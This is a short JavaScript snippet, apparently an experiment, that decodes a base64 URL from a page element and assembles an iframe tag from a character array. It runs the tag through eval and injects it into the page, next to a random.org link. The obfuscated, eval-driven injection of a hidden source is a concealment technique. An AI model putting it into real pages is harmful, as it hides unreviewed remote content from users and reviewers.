var elem = document.getElementById('evalInject')
var dcoded = atob(document.getElementById('heheh').innerHTML)
var makeFun = ['`', '<', 'i', 'f', 'r', 'a', 'm', 'e', ' ', 'i', 'd', '=', "'", 't', 'h', 'e', 'I', 'f', 'r', 'a', 'm', 'e', 'E', 'v', 'a', 'l', 'e', 'd', "'", ' ', 's', 'r', 'c', '=', "'", '$', '{', 'd', 'c', 'o', 'd', 'e', 'd', '}', "'", '>', '<', '/', 'i', 'f', 'r', 'a', 'm', 'e', '>', '`']
elem.innerHTML = `${eval(makeFun.join(''))}<p><a href="https://www.random.org/integers/?num=100&min=1&max=100&col=5&base=10&format=html&rnd=new">this is what I'm injecting</a> &roarr;</p>`
